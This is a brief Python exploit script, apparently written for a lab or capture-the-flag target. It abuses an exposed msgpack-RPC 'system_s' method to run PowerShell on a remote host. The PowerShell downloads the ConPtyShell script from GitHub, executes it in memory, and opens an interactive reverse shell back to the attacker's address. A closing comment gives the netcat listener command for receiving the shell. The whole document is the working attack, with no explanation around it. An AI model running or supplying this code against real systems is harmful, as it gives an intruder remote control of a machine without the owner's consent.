#!/bin/python3
import msgpackrpc

LADDR = "192.168.14.129"
LPORT =  1338

RADDR = "192.168.14.137"
RPORT = 12345

param = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {LADDR} {int(LPORT)}"
client = msgpackrpc.Client(msgpackrpc.Address(RADDR, 12345))
result = client.call('system_s','powershell',param)

# stty raw -echo; (stty size; cat) | nc -lvnp 1338
